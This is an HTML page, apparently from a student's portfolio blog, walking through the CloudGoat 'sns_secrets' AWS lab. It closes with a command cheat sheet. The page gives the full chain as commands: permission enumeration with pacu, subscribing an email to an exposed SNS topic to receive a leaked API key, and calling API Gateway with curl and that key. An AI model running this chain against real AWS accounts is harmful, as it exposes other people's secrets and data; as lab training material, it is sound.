@@ -1,0 +1,337 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" />
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<link rel="apple-touch-icon" sizes="180x180" href="../../favicon/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="../../favicon/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="../../favicon/favicon-16x16.png">
+<link rel="manifest" href="../../favicon/site.webmanifest">
+<link rel="mask-icon" href="../../favicon/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+<link
+  rel="stylesheet"
+  href="https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.css"
+/>
+
+<link
+  rel="stylesheet"
+  href="https://cdn.jsdelivr.net/npm/swiper@11/swiper/css/effect-coverflow.min.css"
+/>
+
+<link rel="stylesheet" href="../../css/custom-swiper.css">
+
+
+
+
+<meta name="msapplication-TileColor" content="#da532c">
+<meta name="theme-color" content="#ffffff">
+<title itemprop="name"> Cloudgoat SNS Secrets | Personal Portfolio 
+</title>
+<meta name="description" content="A biomedical engineering student and cybersecurity enthusiast" />
+<meta property="og:title" content="Cloudgoat SNS Secrets | Personal Portfolio" />
+<meta name="twitter:title" content="Cloudgoat SNS Secrets | Personal Portfolio" />
+<meta itemprop="name" content="Cloudgoat SNS Secrets | Personal Portfolio" />
+<meta name="application-name" content="Cloudgoat SNS Secrets | Personal Portfolio" />
+<meta property="og:description"
+      content="A biomedical engineering student and cybersecurity enthusiast" />
+<meta property="og:site_name" content="Personal Portfolio" />
+<meta property="og:url" content="http://localhost:1313/posts/snssecrets_cloudgoat-walkthrough/" />
+<meta property="og:locale" content="en">
+<meta property="og:image" content="/assets/images/posts/snsSecrets_cloudgoat_challenge_logo.png" />
+<meta property="og:image:secure_url" content="http://localhost:1313/assets/images/posts/snsSecrets_cloudgoat_challenge_logo.png" />
+<meta property="og:type" content="article" />
+
+<script>
+    
+    if (localStorage.getItem('color-theme') === 'dark' || (!('color-theme' in localStorage) && window.matchMedia('(prefers-color-scheme: dark)').matches)) {
+        document.documentElement.classList.add('dark');
+    } else {
+        document.documentElement.classList.remove('dark')
+    }
+</script>
+
+
+
+
+<link rel="stylesheet" href="/css/style.min.0a202f217b79b733be0a4bee09017a95c0ee1defd72592123773a706d3fe0e1f.css" integrity="sha256-CiAvIXt5tzO+CkvuCQF6lcDuHe/XJZISN3OnBtP+Dh8=" />
+
+</head>
+
+<body class="bg-zinc-100 dark:bg-gray-800">
+    <div class="top-0 z-50 w-full text-gray-200 bg-gray-900 border-2 border-gray-900 md:sticky border-b-stone-200/10">
+    <div x-data="{ open: false }" class="flex flex-col max-w-full px-4 mx-auto md:items-center md:justify-between md:flex-row md:px-6 lg:px-8">
+        <div class="flex flex-row items-center justify-between p-4">
+            <a href="../../" class="flex text-gray-100 transition duration-1000 ease-in-out group">
+                <img src="../../images/cyber-immuno-fusion.png" class="transition-opacity h-9 w-9 group-hover:opacity-50 group-focus:opacity-70" alt="Personal Portfolio Logo" />
+                <div class="mt-1 ml-3 text-xl font-black tracking-tight text-gray-100 uppercase transition-colors group-hover:text-gray-400/60">
+                    Personal Portfolio</div>
+            </a>
+            <button class="rounded-lg md:hidden focus:outline-none focus:shadow-outline" @click="open = !open" role="navigation" aria-expanded="false" aria-label="Main" aria-controls="menuItems">
+                <svg fill="currentColor" viewBox="0 0 20 20" class="w-6 h-6">
+                    <path x-show="!open" fill-rule="evenodd" d="M3 5a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 10a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM9 15a1 1 0 011-1h6a1 1 0 110 2h-6a1 1 0 01-1-1z" clip-rule="evenodd"></path>
+                    <path x-show="open" fill-rule="evenodd" d="M4.293 4.293a1 1 0 011.414 0L10 8.586l4.293-4.293a1 1 0 111.414 1.414L11.414 10l4.293 4.293a1 1 0 01-1.414 1.414L10 11.414l-4.293 4.293a1 1 0 01-1.414-1.414L8.586 10 4.293 5.707a1 1 0 010-1.414z" clip-rule="evenodd"></path>
+                </svg>
+            </button>
+        </div>
+        <nav :class="{'flex': open, 'hidden': !open}" class="flex-col flex-grow hidden pb-4 md:pb-0 md:flex md:justify-end md:flex-row">
+            
+            
+            <a class="px-4 py-2 mt-2 text-sm font-semibold rounded-lg md:mt-0 md:ml-4 hover:text-white focus:text-white hover:bg-primary-600 focus:bg-primary-700 focus:outline-none focus:shadow-outline" href="http://localhost:1313/" title="Home">
+                Home
+            </a>
+            
+            
+            
+            <a class="px-4 py-2 mt-2 text-sm font-semibold rounded-lg md:mt-0 md:ml-4 hover:text-white focus:text-white hover:bg-primary-600 focus:bg-primary-700 focus:outline-none focus:shadow-outline" href="http://localhost:1313/about/" title="About">
+                About
+            </a>
+            
+            
+            
+            <a class="px-4 py-2 mt-2 text-sm font-semibold rounded-lg md:mt-0 md:ml-4 hover:text-white focus:text-white hover:bg-primary-600 focus:bg-primary-700 focus:outline-none focus:shadow-outline" href="http://localhost:1313/cybersecurity/" title="Cybersecurity">
+                Cybersecurity
+            </a>
+            
+            
+            
+            <a class="px-4 py-2 mt-2 text-sm font-semibold rounded-lg md:mt-0 md:ml-4 hover:text-white focus:text-white hover:bg-primary-600 focus:bg-primary-700 focus:outline-none focus:shadow-outline" href="http://localhost:1313/posts/" title="Walkthroughs">
+                Walkthroughs
+            </a>
+            
+            
+            
+            <button id="theme-toggle" type="button" class="p-2 text-sm text-gray-500 rounded-lg md: dark:text-gray-400 md:hover:bg-gray-100 dark:md:hover:bg-gray-700 md:focus:outline-none md:focus:ring-4 md:focus:ring-gray-200 dark:md:focus:ring-gray-700 md:ml-2 xs:hidden">
+                <svg id="theme-toggle-dark-icon" class="hidden w-5 h-5" fill="currentColor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M17.293 13.293A8 8 0 016.707 2.707a8.001 8.001 0 1010.586 10.586z">
+                    </path>
+                </svg>
+                <svg id="theme-toggle-light-icon" class="hidden w-5 h-5" fill="currentColor" viewBox="0 0 20 20" aria-label="Dark or Light Mode" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M10 2a1 1 0 011 1v1a1 1 0 11-2 0V3a1 1 0 011-1zm4 8a4 4 0 11-8 0 4 4 0 018 0zm-.464 4.95l.707.707a1 1 0 001.414-1.414l-.707-.707a1 1 0 00-1.414 1.414zm2.12-10.607a1 1 0 010 1.414l-.706.707a1 1 0 11-1.414-1.414l.707-.707a1 1 0 011.414 0zM17 11a1 1 0 100-2h-1a1 1 0 100 2h1zm-7 4a1 1 0 011 1v1a1 1 0 11-2 0v-1a1 1 0 011-1zM5.05 6.464A1 1 0 106.465 5.05l-.708-.707a1 1 0 00-1.414 1.414l.707.707zm1.414 8.486l-.707.707a1 1 0 01-1.414-1.414l.707-.707a1 1 0 011.414 1.414zM4 11a1 1 0 100-2H3a1 1 0 000 2h1z" fill-rule="evenodd" clip-rule="evenodd"></path>
+                </svg>
+            </button>
+            
+        </nav>
+    </div>
+</div>
+    
+<article>
+  <header class="mb-4 bg-primary-600">
+    <span class="py-96">
+      <h1 class="py-16 text-5xl font-black text-center text-white capitalize">
+        Cloudgoat SNS Secrets
+      </h1>
+    </span>
+  </header>
+  <div class="max-w-4xl mx-auto mt-8 mb-2">
+    <div class="px-6">
+      
+      
+      
+      
+      
+      
+      <img src="../../../assets/images/posts/snsSecrets_cloudgoat_challenge_logo_hu_93f6ef5a9272d91a.webp" srcset=", /../assets/images/posts/snsSecrets_cloudgoat_challenge_logo_hu_7429a7b34ee49fa4.webp 400w, /../assets/images/posts/snsSecrets_cloudgoat_challenge_logo_hu_3c9f49f5aa198b5f.webp 550w, /../assets/images/posts/snsSecrets_cloudgoat_challenge_logo_hu_d893834d48f1127a.webp 768w, /../assets/images/posts/snsSecrets_cloudgoat_challenge_logo_hu_93f6ef5a9272d91a.webp 1100w"
+           class="object-fill overflow-hidden rounded-lg shadow-lg ring-4 ring-zinc-300/40 dark:ring-gray-900/40 shadow-neutral-100/20 dark:shadow-neutral-800/40"
+           width="100%" alt="" />
+      
+      
+    </div>
+  </div>
+  
+  <div class="max-w-2xl px-6 pt-6 pb-16 mx-auto prose dark:prose-invert dark:text-white">
+    <h1 id="introduction--context">Introduction &amp; Context</h1>
+<p>Hey guys, this is a write-up for the sns_secrets challenge from Cloudgoat, available <a href="https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/cloudgoat/scenarios/aws/sns_secrets/README.md">here</a>. The lab will give you credentials to do some basic enumeration on SNS &amp; the API Gateway but not much more than that. This is the second and final capstone challenge from Tyler&rsquo;s <a href="https://academy.simplycyber.io/l/pdp/introduction-to-aws-pentesting">Intro to AWS Pentesting course</a>. As a capstone challenge it was unguided and I had to run through it myself. I&rsquo;ll walk through how I did it (mostly manually) but also point out how you could run it through pacu if you want. I&rsquo;ll be giving some of my thoughts and the commands I ran through this lab. Now onto the lab!</p>
+<h1 id="setup">Setup</h1>
+<p>If you haven&rsquo;t started cloudgoat yet, you can start with <code>cloudgoat create sns_secrets</code>. Shouldn&rsquo;t take too long to boot up. Once it&rsquo;s set, add the credentials using <code>aws configure --profile sns_low</code>. I set the region to <code>us-east-1</code> and the format as <code>json</code>.</p>
+<p>Of course, we need to validate the keys before using them. Run <code>aws sts get-caller-identity --profile sns_low</code>. It should work as that. So let&rsquo;s start!</p>
+<h1 id="enumerating-users">Enumerating users</h1>
+<p>So for this part I&rsquo;m going to use pacu and hope it works. I&rsquo;ll try enumerating the sns user first. Get it running using these commands:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pacu 
+</span></span><span style="display:flex;"><span>import_keys sns_low
+</span></span><span style="display:flex;"><span>ran iam__enum_permissions
+</span></span></code></pre></div><p>Once that runs (and thankfully it does), run <code>whoami</code> in the pacu interface to see what we got. Under permissions you&rsquo;ll see we have the following:</p>
+<ul>
+<li><em>sns:listtopics</em></li>
+<li><em>sns:listsubscriptionsbytopic</em></li>
+<li><em>sns:gettopicattributes</em></li>
+<li>iam:getuserpolicy</li>
+<li>iam:getattacheduserpolicies</li>
+<li>iam:listuserpolicies</li>
+<li>iam:listgroupsforuser</li>
+<li><em>sns:subscribe</em></li>
+<li>apigateway:get</li>
+<li><em>sns:receive</em></li>
+</ul>
+<p>You&rsquo;ll notice that we&rsquo;re also denied a few things about api-gateway, but we can burn that bridge when we get to it. But here&rsquo;s the key part. The first few sns permissions seem to be related to enumeration while the last couple are about using the system. Those will probably be useful.</p>
+<h1 id="simple-notification-servicesns">Simple Notification Service(SNS)</h1>
+<h2 id="what-is-it-cli-commands">What is it? CLI Commands?</h2>
+<p>Before we go into SNS we should learn what it is. SNS is amazon&rsquo;s simple notification service. According to <a href="https://aws.amazon.com/sns/">this site</a>, it&rsquo;s a &ldquo;fully managed Pub/Sub service for A2A and A2P messaging&rdquo;. That basically means it&rsquo;s used for sending notifications to people or other applications. It can be used to send SMS, emails and mobile push notifications too. One of the use cases is &ldquo;securely encrypt notification message delivery&rdquo;. We&rsquo;ll see how secure this SNS configuration is&hellip; If you&rsquo;re curious to learn more, just google it, lots of youtube videos pop up that can explain it way better than I can in a blog post.</p>
+<p>So now that I&rsquo;ve done a few AWS labs through cloudgoat and seen the json policies for them, I&rsquo;ve noticed a pattern in them. When I have a permission like <code>iam:getuserpolicy</code>, the execution is typically like <code>aws sns get-user-policy --MoreFlags</code>. So taking a wild guess, we&rsquo;re just gonna play around and execute some commands.</p>
+<h2 id="enumerate">Enumerate</h2>
+<p>We&rsquo;re given 3 for enumerating and 2 for using it I think. The second and third say list or get by topic. So we&rsquo;ll need to figure out what the topics are and it seems the first command can do that. A topic by the way is an access point or communciation channel that is used to send messages, according to <a href="https://docs.aws.amazon.com/sns/latest/dg/sns-create-topic.html">this site</a>. So run <code>aws sns list-topics --profile sns_low</code> and you&rsquo;ll receive a response giving you a topic arn:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;Topics&#34;</span>: [
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;TopicArn&#34;</span>: <span style="color:#e6db74">&#34;arn:aws:sns:us-east-1:381491899745:public-topic-cgidth6ftmf8pq&#34;</span>
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    ]
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>So now we can try to see if we can pull anything else off that. Try running <code>aws sns list-subscription-by-topic --profile sns_low</code>. That won&rsquo;t work and it says you&rsquo;ll need to add the topic arn as a flag.</p>
+<p>So that&rsquo;s the flag we&rsquo;re going to use for the next couple commands (of course use your own topic):</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>aws sns list-subscriptions-by-topic --topic-arn arn:aws:sns:us-east-1:381491899745:public-topic-cgidth6ftmf8pq --profile sns_low
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>aws sns get-topic-attributes --topic-arn arn:aws:sns:us-east-1:381491899745:public-topic-cgidth6ftmf8pq --profile sns_low  
+</span></span></code></pre></div><p>It seems there are no subscribers to it yet. But it does seem to have a policy to send stuff if we look at the <code>EffectiveDeliveryPolicy</code> output from the second command.</p>
+<p>So pull up the <a href="https://docs.aws.amazon.com/cli/latest/reference/sns/subscribe.html">documentation</a> and you&rsquo;ll see we can subscribe by email. So let&rsquo;s give that a shot. I had to ask chatgpt the full command for this once I understood it was, but here you go:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>aws sns subscribe --topic-arn arn:aws:sns:us-east-1:381491899745:public-topic-cgidth6ftmf8pq --protocol email --region us-east-1 --profile sns_low --notification-endpoint YOUR_EMAIL_HERE
+</span></span></code></pre></div><p>I thought we might need to force a receive too, but what do you know. A minute later I get a confirmation email and then a minute later I get another email. And that email had the DEBUG: API GATEWAY KEY!</p>
+<h2 id="an-automated-approach">An automated approach?</h2>
+<p>I did this manually but you can also do this by using pacu. If you open pacu using <code>pacu</code>, then <code>import_keys sns_low</code> there&rsquo;s only 2 commands you need to run to get those emails sent to you.</p>
+<ol>
+<li><code>run sns__enum --region us-east-1</code></li>
+<li><code>data iam</code> Grab the topic arn from it</li>
+<li><code>run sns__subscribe --topics TOPICARN --email EMAIL</code></li>
+</ol>
+<h1 id="api-gateway">API Gateway</h1>
+<h2 id="what-is-it">What is it?</h2>
+<p>Again, before we go into enumerating this service we should understand what it actually does. According to <a href="https://aws.amazon.com/api-gateway/">this site</a>, it&rsquo;s a service that allows developers to make &ldquo;secure&rdquo; APIs at scale. An API is really just an access point for users or applications to interact with something, whether that&rsquo;s a website or a server or something else entirely. But it&rsquo;s only as secure as you make it. So if you have an SNS system that leaks an API key&hellip; Well, maybe it&rsquo;s not so secure.</p>
+<h1 id="finding-the-api">Finding the API</h1>
+<p>I had to ask ChatGPT for some of the commands here. I&rsquo;ll make a note though, don&rsquo;t just blindly copy paste the commands it gives you. It does make assumptions (like it assumed the stage was <code>prod</code> and led me on a wild goose chase). Actually take the time to understand the command syntax and what it&rsquo;s giving you before going on.</p>
+<p>The first command is to find out what api&rsquo;s are by running <code>aws apigateway get-rest-apis --profile sns_low</code>. The key part is the id (first thing in the response). Mine was: <code>&quot;id&quot;: &quot;696zi4tra7&quot;</code>.</p>
+<p>Now ChatGPT said to grab teh resources using <code>aws apigateway get-resources --rest-api-id 696zi4tra7 --region us-east-1 --profile sns_low</code>. Under the items section, you&rsquo;ll notice the path is <code>/user-data</code>. Note that down.</p>
+<p>And finally we need to grab the actual stage name using <code>aws apigateway get-stages --rest-api-id 696zi4tra7 --region us-east-1 --profile sns_low</code>. Under the stageName you&rsquo;ll see something like <code>prod-cgidth6ftmf8pq</code>. And that&rsquo;s all the information we need.</p>
+<h2 id="call-the-api">Call the Api</h2>
+<p>To construct the link we&rsquo;re going to target, use this format:</p>
+<p><a href="https://ID.execute-api.us-east-1.amazonaws.com/STAGENAME/PATH">https://ID.execute-api.us-east-1.amazonaws.com/STAGENAME/PATH</a></p>
+<p>Mine was <code>https://696zi4tra7.execute-api.us-east-1.amazonaws.com/prod-cgidth6ftmf8pq/user-data</code>. Yours should be similar.</p>
+<p>Now we can call it by passing in the api key using curl: <code>curl -v -H &quot;x-api-key: 45a3da610dc64703b10e273a4db135bf&quot; https://696zi4tra7.execute-api.us-east-1.amazonaws.com/prod-cgidth6ftmf8pq/user-data</code></p>
+<p>And you&rsquo;ll get your flag!</p>
+<h1 id="conclusion">Conclusion</h1>
+<p>This was an interesting lab where I had to use a lot of the documentation and playing around to get the right commands. We started by enumerating SNS and subscribing ourself to a topic. Using that we found an API key which we could then use the look into the Api gateway and grab our flag.</p>
+<p><em>Don&rsquo;t forget to destroy your lab after!</em></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cloudgoat destroy sns_secrets
+</span></span></code></pre></div><h1 id="cheat-sheet">Cheat Sheet</h1>
+<p>To close off, here&rsquo;s a quick summary of the commands we needed to run to complete this module. If you&rsquo;re ever coming back to this and just need that one command, this is the section to check.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#Start Up</span>
+</span></span><span style="display:flex;"><span>cloudgoat create sns_secrets
+</span></span><span style="display:flex;"><span>aws configure --profile sns_low
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#Pacu our permissions</span>
+</span></span><span style="display:flex;"><span>pacu
+</span></span><span style="display:flex;"><span>import_keys sns_low
+</span></span><span style="display:flex;"><span>run iam__enum_permissions
+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>exit
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#Enumerate SNS</span>
+</span></span><span style="display:flex;"><span>aws sns list-topics --profile sns_low
+</span></span><span style="display:flex;"><span>aws sns list-subscriptions-by-topic --topic-arn arn:aws:sns:us-east-1:381491899745:public-topic-cgidth6ftmf8pq --profile sns_low
+</span></span><span style="display:flex;"><span>aws sns get-topic-attributes --topic-arn arn:aws:sns:us-east-1:381491899745:public-topic-cgidth6ftmf8pq --profile sns_low   
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#Subscribe </span>
+</span></span><span style="display:flex;"><span>aws sns subscribe --topic-arn arn:aws:sns:us-east-1:381491899745:public-topic-cgidth6ftmf8pq --protocol email --region us-east-1 --profile sns_low --notification-endpoint unrealperson50@gmail.com
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#Alternatively using pacu</span>
+</span></span><span style="display:flex;"><span>pacu
+</span></span><span style="display:flex;"><span>run sns__enum --region us-east-1
+</span></span><span style="display:flex;"><span>data iam 
+</span></span><span style="display:flex;"><span>run sns__subscribe
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#Find the api</span>
+</span></span><span style="display:flex;"><span>aws apigateway get-rest-apis --profile sns_low
+</span></span><span style="display:flex;"><span>aws apigateway get-resources --rest-api-id 696zi4tra7 --region us-east-1 --profile sns_low
+</span></span><span style="display:flex;"><span>aws apigateway get-stages --rest-api-id 696zi4tra7 --region us-east-1 --profile sns_low
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#And call it for the flag</span>
+</span></span><span style="display:flex;"><span>curl -v -H <span style="color:#e6db74">&#34;x-api-key: 45a3da610dc64703b10e273a4db135bf&#34;</span> https://696zi4tra7.execute-api.us-east-1.amazonaws.com/prod-cgidth6ftmf8pq/user-data
+</span></span></code></pre></div><pre tabindex="0"><code></code></pre>
+  </div>
+</article>
+
+    
+<script defer src="https://cdn.jsdelivr.net/npm/alpinejs@3.x.x/dist/cdn.min.js"></script>
+
+<script src="../../js/darkmode.js" defer></script>
+  
+
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.js" defer></script>
+
+  <script defer>
+    document.addEventListener('DOMContentLoaded', () => {
+      new Swiper('.swiper', {
+        effect: 'coverflow',
+        grabCursor: true,
+        centeredSlides: true,
+
+        slidesPerView: 'auto',
+        spaceBetween: 30,
+        loop: true,
+
+        coverflowEffect: {
+          rotate: 30,
+          stretch: 0,
+          depth: 150,
+          modifier: 1,
+          slideShadows: true,
+        },
+
+        
+        pagination: {
+          el: '.swiper-pagination',
+          clickable: true,
+        },
+        
+        navigation: {
+          nextEl: '.swiper-button-next',
+          prevEl: '.swiper-button-prev',
+        },
+
+        on: {
+          slideChange() {
+            
+            const idx = this.realIndex;
+            document.getElementById('cert-caption').innerText = certData[idx].description;
+          }
+        }
+      });
+    });
+  </script>
+
+
+
+<footer class="bg-gray-900">
+    <div class="max-w-md px-4 py-12 mx-auto overflow-hidden sm:max-w-3xl sm:px-6 lg:max-w-7xl lg:px-8">
+        <nav class="flex flex-wrap justify-center -mx-5 -my-2" aria-label="Footer">
+            
+            <div class="px-5 py-2">
+                <a href="http://localhost:1313/about/" class="text-base text-gray-400 hover:text-gray-300">About</a>
+            </div>
+            
+            <div class="px-5 py-2">
+                <a href="http://localhost:1313/cybersecurity" class="text-base text-gray-400 hover:text-gray-300">Cybersecurity</a>
+            </div>
+            
+            <div class="px-5 py-2">
+                <a href="http://localhost:1313/walkthroughs" class="text-base text-gray-400 hover:text-gray-300">Walkthroughs</a>
+            </div>
+            
+        </nav>
+        <p class="mt-8 text-base text-center text-gray-400">&copy; 2025
+            Personal Portfolio. All rights
+            reserved.</p>
+        <p class="mt-2 text-base text-center text-gray-400">Theme made with &#x2764;&#xfe0f; by <a
+               href="https://nusserstudios.com" class="hover:underline hover:text-primary-600"><span
+                      class="font-black uppercase">Nusser</span> <span class="font-light uppercase">Studios.</span></a>
+        </p>
+    </div>
+</footer>
+</body>
+
+</html>
